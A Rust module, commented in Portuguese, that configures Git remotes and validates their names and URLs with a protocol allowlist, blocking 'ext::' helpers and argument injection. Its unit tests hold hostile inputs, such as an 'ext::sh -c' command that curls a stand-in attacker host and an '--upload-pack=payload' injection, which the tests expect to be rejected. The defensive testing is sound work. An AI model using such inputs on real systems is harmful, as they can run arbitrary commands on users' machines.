//! Remotes como entidade de primeira classe.
//!
//! Este módulo cuida de CONFIGURAÇÃO de remotes — listar, adicionar, remover,
//! renomear, trocar URL. Operações que atravessam a rede vivem em `sync.rs`:
//! configurar um destino e falar com ele têm riscos diferentes e não devem
//! compartilhar caminho de código.
//!
//! Regra de segurança central: nome e URL de remote são entrada controlada
//! pelo usuário que vira argumento de processo. Toda entrada é validada antes
//! de chegar ao `git`, e a validação recusa por allowlist, não por blocklist.

use std::path::Path;

use super::errors::{codes, sanitize, GitOperationError};
use super::git_cli;
use super::models::{GitRemote, GitRemoteIdentity, GitRemotesView, GitUpstream};

/// Protocolos aceitos. Tudo fora desta lista é recusado.
///
/// `ext::` e `fd::` são deliberadamente ausentes: são remote helpers do próprio
/// Git capazes de EXECUTAR comandos arbitrários da máquina do usuário. Um
/// remote `ext::sh -c ...` transforma um "fetch" em execução remota de código.
const ALLOWED_SCHEMES: [&str; 5] = ["https://", "http://", "ssh://", "git://", "file://"];

/// Caracteres aceitos em nome de remote.
fn is_valid_remote_name(name: &str) -> bool {
    if name.is_empty() || name.len() > 100 {
        return false;
    }

    // Um nome iniciado por '-' seria lido pelo git como opção de linha de
    // comando, não como nome: é injeção de argumento.
    if name.starts_with('-') || name.starts_with('.') {
        return false;
    }

    name.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

pub fn validate_name(name: &str) -> Result<&str, GitOperationError> {
    let name = name.trim();

    if !is_valid_remote_name(name) {
        return Err(GitOperationError::new(
            codes::INVALID_REMOTE_NAME,
            "Nome de remote inválido.",
        )
        .with_action(
            "Use apenas letras, números, ponto, hífen e underscore, sem iniciar por '-' ou '.'.",
        ));
    }

    Ok(name)
}

/// Valida a URL por allowlist de protocolo, aceitando também a forma SCP
/// (`git@host:owner/repo.git`) que o Git entende sem esquema explícito.
pub fn validate_url(url: &str) -> Result<&str, GitOperationError> {
    let url = url.trim();

    if url.is_empty() || url.len() > 2000 {
        return Err(GitOperationError::new(
            codes::INVALID_REMOTE_URL,
            "A URL do remote não pode estar vazia.",
        ));
    }

    if url.starts_with('-') {
        return Err(GitOperationError::new(
            codes::UNSAFE_REMOTE_URL,
            "A URL não pode começar com '-'.",
        )
        .with_action("O Git leria esse valor como opção de linha de comando."));
    }

    let lowered = url.to_ascii_lowercase();

    if ALLOWED_SCHEMES.iter().any(|scheme| lowered.starts_with(scheme)) {
        return Ok(url);
    }

    if is_scp_like(url) || is_local_path(url) {
        return Ok(url);
    }

    if lowered.contains("::") {
        return Err(GitOperationError::new(
            codes::UNSAFE_REMOTE_URL,
            "Este formato de URL usa um remote helper e não é aceito.",
        )
        .with_details(sanitize(url.to_string()))
        .with_action(
            "Remote helpers como 'ext::' podem executar comandos na sua máquina durante um fetch.",
        ));
    }

    Err(GitOperationError::new(
        codes::INVALID_REMOTE_URL,
        "Protocolo de remote não suportado.",
    )
    .with_details(sanitize(url.to_string()))
    .with_action("Use https://, ssh://, git:// ou a forma git@host:owner/repo.git."))
}

/// Caminho local: repositório em disco, share de rede ou clone espelho.
///
/// É legítimo e comum (bare repo local, mirror numa pasta compartilhada) e não
/// oferece o risco dos remote helpers: nenhum comando é executado por causa da
/// URL. Aceitar caminho local também permite testar push/fetch sem rede.
fn is_local_path(url: &str) -> bool {
    let bytes = url.as_bytes();

    // POSIX absoluto, UNC do Windows, ou unidade com letra (C:\ ou C:/).
    url.starts_with('/')
        || url.starts_with("\\\\")
        || (bytes.len() > 2
            && bytes[0].is_ascii_alphabetic()
            && bytes[1] == b':'
            && (bytes[2] == b'\\' || bytes[2] == b'/'))
}

/// `git@github.com:owner/repo.git` — usuário, host, dois-pontos e caminho.
fn is_scp_like(url: &str) -> bool {
    let Some((prefix, path)) = url.split_once(':') else {
        return false;
    };

    if prefix.is_empty() || path.is_empty() || prefix.contains('/') {
        return false;
    }

    let host = prefix.rsplit('@').next().unwrap_or("");

    !host.is_empty()
        && host.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-'))
        && host.contains('.')
}

/// Extrai host/owner/repositório de uma URL de remote.
///
/// É pura de propósito: a detecção de provider (GitHub e futuros) parte daqui,
/// e ela precisa ser testável sem repositório e sem rede.
pub fn parse_identity(url: &str) -> GitRemoteIdentity {
    let cleaned = url.trim();
    let without_scheme = ALLOWED_SCHEMES
        .iter()
        .find_map(|scheme| {
            let lowered = cleaned.to_ascii_lowercase();
            lowered
                .starts_with(scheme)
                .then(|| cleaned[scheme.len()..].to_string())
        })
        .unwrap_or_else(|| cleaned.to_string());

    // Credencial embutida nunca entra no modelo exibido.
    let without_credentials = match without_scheme.split_once('@') {
        Some((_, rest)) if !rest.is_empty() => rest.to_string(),
        _ => without_scheme,
    };

    // Três formas convivem aqui e a ordem de corte importa:
    //   host/owner/repo        (https, depois de tirar o esquema)
    //   host:owner/repo        (scp, onde ':' separa host do caminho)
    //   host:22/owner/repo     (ssh com porta, onde ':' NÃO é separador)
    // Cortar sempre no primeiro '/' quebra a forma scp; cortar sempre no ':'
    // quebra a forma com porta.
    let colon = without_credentials.find(':');
    let slash = without_credentials.find('/');

    let (host_part, path_part) = match (colon, slash) {
        (Some(colon), slash) if slash.is_none_or(|slash| colon < slash) => {
            let after = &without_credentials[colon + 1..];
            let port_digits: String =
                after.chars().take_while(|c| c.is_ascii_digit()).collect();
            let has_port = !port_digits.is_empty()
                && after[port_digits.len()..].starts_with('/');

            if has_port {
                let rest = &after[port_digits.len() + 1..];
                (without_credentials[..colon].to_string(), rest.to_string())
            } else {
                (without_credentials[..colon].to_string(), after.to_string())
            }
        }
        (_, Some(slash)) => (
            without_credentials[..slash].to_string(),
            without_credentials[slash + 1..].to_string(),
        ),
        _ => (without_credentials.clone(), String::new()),
    };

    let host = host_part.trim().to_ascii_lowercase();

    let trimmed_path = path_part.trim_matches('/');
    let path_without_git = trimmed_path
        .strip_suffix(".git")
        .unwrap_or(trimmed_path)
        .to_string();

    let mut segments = path_without_git.split('/').filter(|s| !s.is_empty());
    let owner = segments.next().map(str::to_string);
    let repository = segments.next_back().map(str::to_string);

    // Um caminho com apenas um segmento não identifica owner/repo.
    let (owner, repository) = match (owner, repository) {
        (Some(owner), Some(repository)) if owner != repository => (Some(owner), Some(repository)),
        (Some(single), _) if path_without_git.contains('/') => (Some(single), None),
        (Some(single), _) => (None, Some(single)),
        _ => (None, None),
    };

    let provider = match host.as_str() {
        "github.com" | "www.github.com" => "github",
        "gitlab.com" => "gitlab",
        "bitbucket.org" => "bitbucket",
        "" => "unknown",
        _ => "other",
    };

    GitRemoteIdentity {
        host: (!host.is_empty()).then_some(host),
        owner,
        repository,
        provider: provider.to_string(),
    }
}

/// Lista os remotes com URL de fetch e de push.
///
/// `git remote -v` é uma chamada só e já traz as duas URLs; consultar
/// `get-url` remote a remote multiplicaria processos sem ganho.
pub fn list(path: &Path) -> Result<Vec<GitRemote>, GitOperationError> {
    let raw = run(path, &["remote", "-v"])?;

    let mut remotes: Vec<GitRemote> = Vec::new();

    for line in raw.lines() {
        let mut parts = line.split_whitespace();
        let (Some(name), Some(url), Some(kind)) = (parts.next(), parts.next(), parts.next()) else {
            continue;
        };

        let is_push = kind.contains("push");
        let identity = parse_identity(url);

        match remotes.iter_mut().find(|remote| remote.name == name) {
            Some(existing) => {
                if is_push {
                    existing.push_url = url.to_string();
                } else {
                    existing.fetch_url = url.to_string();
                    existing.identity = identity;
                }
            }
            None => remotes.push(GitRemote {
                name: name.to_string(),
                fetch_url: if is_push { String::new() } else { url.to_string() },
                push_url: if is_push { url.to_string() } else { String::new() },
                is_origin: name == "origin",
                is_upstream: false,
                identity,
            }),
        }
    }

    // Um remote configurado só para fetch tem push_url igual à de fetch.
    for remote in remotes.iter_mut() {
        if remote.push_url.is_empty() {
            remote.push_url = remote.fetch_url.clone();
        }
        if remote.fetch_url.is_empty() {
            remote.fetch_url = remote.push_url.clone();
        }
    }

    Ok(remotes)
}

/// Upstream da branch atual, com ahead/behind reais.
pub fn read_upstream(path: &Path, branch: &str) -> Option<GitUpstream> {
    if branch.is_empty() {
        return None;
    }

    let upstream = run(path, &["rev-parse", "--abbrev-ref", "--symbolic-full-name", "@{u}"]).ok()?;
    let upstream = upstream.trim().to_string();

    if upstream.is_empty() {
        return None;
    }

    let (remote, remote_branch) = split_upstream(path, &upstream);

    // Upstream configurado cuja ref sumiu do disco: 'gone'. Isso acontece
    // depois que alguém apaga a branch no remote e o fetch traz a poda.
    let gone = run(path, &["rev-parse", "--verify", "--quiet", &upstream]).is_err();

    let (behind, ahead) = if gone {
        (0, 0)
    } else {
        read_ahead_behind(path, &upstream, "HEAD").unwrap_or((0, 0))
    };

    Some(GitUpstream {
        remote,
        branch: remote_branch,
        ref_name: upstream,
        ahead,
        behind,
        gone,
    })
}

/// Separa `origin/feature/x` em remote e branch usando os remotes REAIS.
///
/// Cortar no primeiro '/' quebraria com branches que contêm barra; por isso a
/// separação usa a lista de remotes configurados como prefixo conhecido.
pub fn split_upstream(path: &Path, upstream: &str) -> (String, String) {
    if let Ok(remotes) = list(path) {
        for remote in remotes {
            let prefix = format!("{}/", remote.name);
            if let Some(branch) = upstream.strip_prefix(&prefix) {
                return (remote.name, branch.to_string());
            }
        }
    }

    match upstream.split_once('/') {
        Some((remote, branch)) => (remote.to_string(), branch.to_string()),
        None => (String::new(), upstream.to_string()),
    }
}

/// `git rev-list --left-right --count base...head` -> (atrás, à frente).
pub fn read_ahead_behind(
    path: &Path,
    base: &str,
    head: &str,
) -> Option<(usize, usize)> {
    let range = format!("{base}...{head}");
    let raw = run(path, &["rev-list", "--left-right", "--count", &range]).ok()?;
    let mut parts = raw.split_whitespace();
    let behind = parts.next()?.parse().ok()?;
    let ahead = parts.next()?.parse().ok()?;
    Some((behind, ahead))
}

/// Visão completa: remotes, remote principal e upstream da branch atual.
pub fn get_view(path: &Path) -> Result<GitRemotesView, GitOperationError> {
    let mut remotes = list(path)?;
    let current_branch = run(path, &["branch", "--show-current"])
        .map(|value| value.trim().to_string())
        .unwrap_or_default();

    let upstream = read_upstream(path, &current_branch);

    if let Some(upstream) = &upstream {
        for remote in remotes.iter_mut() {
            remote.is_upstream = remote.name == upstream.remote;
        }
    }

    let default_remote = detect_default(&remotes, upstream.as_ref());

    Ok(GitRemotesView {
        remotes,
        default_remote,
        current_branch: (!current_branch.is_empty()).then_some(current_branch),
        upstream,
    })
}

/// Remote principal: o upstream da branch atual, senão `origin`, senão o único.
///
/// A ordem importa — a branch em que o usuário está diz mais sobre a intenção
/// dele do que a convenção de nome.
fn detect_default(remotes: &[GitRemote], upstream: Option<&GitUpstream>) -> Option<String> {
    if let Some(upstream) = upstream {
        if remotes.iter().any(|remote| remote.name == upstream.remote) {
            return Some(upstream.remote.clone());
        }
    }

    if remotes.iter().any(|remote| remote.is_origin) {
        return Some("origin".to_string());
    }

    match remotes {
        [single] => Some(single.name.clone()),
        _ => remotes.first().map(|remote| remote.name.clone()),
    }
}

pub fn add(path: &Path, name: &str, url: &str) -> Result<(), GitOperationError> {
    let name = validate_name(name)?;
    let url = validate_url(url)?;

    if list(path)?.iter().any(|remote| remote.name == name) {
        return Err(GitOperationError::new(
            codes::REMOTE_ALREADY_EXISTS,
            format!("Já existe um remote chamado '{name}'."),
        ));
    }

    run(path, &["remote", "add", name, url])?;
    Ok(())
}

pub fn remove(path: &Path, name: &str) -> Result<(), GitOperationError> {
    let name = validate_name(name)?;
    ensure_exists(path, name)?;
    run(path, &["remote", "remove", name])?;
    Ok(())
}

pub fn rename(path: &Path, from: &str, to: &str) -> Result<(), GitOperationError> {
    let from = validate_name(from)?;
    let to = validate_name(to)?;
    ensure_exists(path, from)?;

    if list(path)?.iter().any(|remote| remote.name == to) {
        return Err(GitOperationError::new(
            codes::REMOTE_ALREADY_EXISTS,
            format!("Já existe um remote chamado '{to}'."),
        ));
    }

    run(path, &["remote", "rename", from, to])?;
    Ok(())
}

/// Troca a URL de um remote. `push_only` altera apenas o destino de push.
pub fn set_url(
    path: &Path,
    name: &str,
    url: &str,
    push_only: bool,
) -> Result<(), GitOperationError> {
    let name = validate_name(name)?;
    let url = validate_url(url)?;
    ensure_exists(path, name)?;

    let mut args = vec!["remote", "set-url"];
    if push_only {
        args.push("--push");
    }
    args.push(name);
    args.push(url);

    run(path, &args)?;
    Ok(())
}

fn ensure_exists(path: &Path, name: &str) -> Result<(), GitOperationError> {
    if list(path)?.iter().any(|remote| remote.name == name) {
        return Ok(());
    }

    Err(GitOperationError::new(
        codes::REMOTE_NOT_FOUND,
        format!("O remote '{name}' não existe neste repositório."),
    ))
}

/// Executa Git classificando falha de processo separada de falha de comando.
fn run(path: &Path, args: &[&str]) -> Result<String, GitOperationError> {
    let output = git_cli::run_structured(path, args).map_err(|error| {
        GitOperationError::critical(codes::GIT_NOT_FOUND, "Não foi possível executar o Git.")
            .with_details(error.to_string())
    })?;

    if !output.success {
        return Err(GitOperationError::new(
            codes::GIT_COMMAND_FAILED,
            "O Git recusou a operação de remote.",
        )
        .with_details(sanitize(output.stderr)));
    }

    Ok(output.stdout)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn identidade_de_url_https_do_github() {
        let identity = parse_identity("https://github.com/Korteexz/DEWRENCH.git");
        assert_eq!(identity.host.as_deref(), Some("github.com"));
        assert_eq!(identity.owner.as_deref(), Some("Korteexz"));
        assert_eq!(identity.repository.as_deref(), Some("DEWRENCH"));
        assert_eq!(identity.provider, "github");
    }

    #[test]
    fn identidade_de_url_ssh_com_porta() {
        let identity = parse_identity("ssh://git@git.exemplo.dev:2222/time/projeto.git");
        assert_eq!(identity.host.as_deref(), Some("git.exemplo.dev"));
        assert_eq!(identity.owner.as_deref(), Some("time"));
        assert_eq!(identity.repository.as_deref(), Some("projeto"));
    }

    #[test]
    fn identidade_de_url_scp() {
        let identity = parse_identity("git@github.com:Korteexz/DEWRENCH.git");
        assert_eq!(identity.host.as_deref(), Some("github.com"));
        assert_eq!(identity.owner.as_deref(), Some("Korteexz"));
        assert_eq!(identity.repository.as_deref(), Some("DEWRENCH"));
    }

    #[test]
    fn identidade_nao_expoe_credencial() {
        let identity = parse_identity("https://user:token@github.com/owner/repo.git");
        assert_eq!(identity.host.as_deref(), Some("github.com"));
        assert_eq!(identity.owner.as_deref(), Some("owner"));
    }

    #[test]
    fn identidade_de_host_desconhecido() {
        let identity = parse_identity("https://git.exemplo.dev/time/projeto.git");
        assert_eq!(identity.provider, "other");
        assert_eq!(identity.owner.as_deref(), Some("time"));
    }

    #[test]
    fn url_com_remote_helper_e_recusada() {
        let error = validate_url("ext::sh -c 'curl evil.example'").unwrap_err();
        assert_eq!(error.code, codes::UNSAFE_REMOTE_URL);
    }

    #[test]
    fn url_iniciada_por_hifen_e_recusada() {
        let error = validate_url("--upload-pack=payload").unwrap_err();
        assert_eq!(error.code, codes::UNSAFE_REMOTE_URL);
    }

    #[test]
    fn url_de_protocolo_desconhecido_e_recusada() {
        assert!(validate_url("javascript:alert(1)").is_err());
        assert!(validate_url("rsync://host/repo").is_err());
    }

    #[test]
    fn caminho_local_e_aceito() {
        assert!(validate_url("/srv/git/projeto.git").is_ok());
        assert!(validate_url("C:\\repos\\projeto.git").is_ok());
        assert!(validate_url("file:///srv/git/projeto.git").is_ok());
    }

    #[test]
    fn urls_validas_sao_aceitas() {
        assert!(validate_url("https://github.com/owner/repo.git").is_ok());
        assert!(validate_url("ssh://git@github.com/owner/repo.git").is_ok());
        assert!(validate_url("git@github.com:owner/repo.git").is_ok());
    }

    #[test]
    fn nome_de_remote_invalido_e_recusado() {
        assert!(validate_name("-x").is_err());
        assert!(validate_name("com espaco").is_err());
        assert!(validate_name("com/barra").is_err());
        assert!(validate_name("").is_err());
        assert!(validate_name("origin").is_ok());
        assert!(validate_name("meu-fork_2.0").is_ok());
    }
}
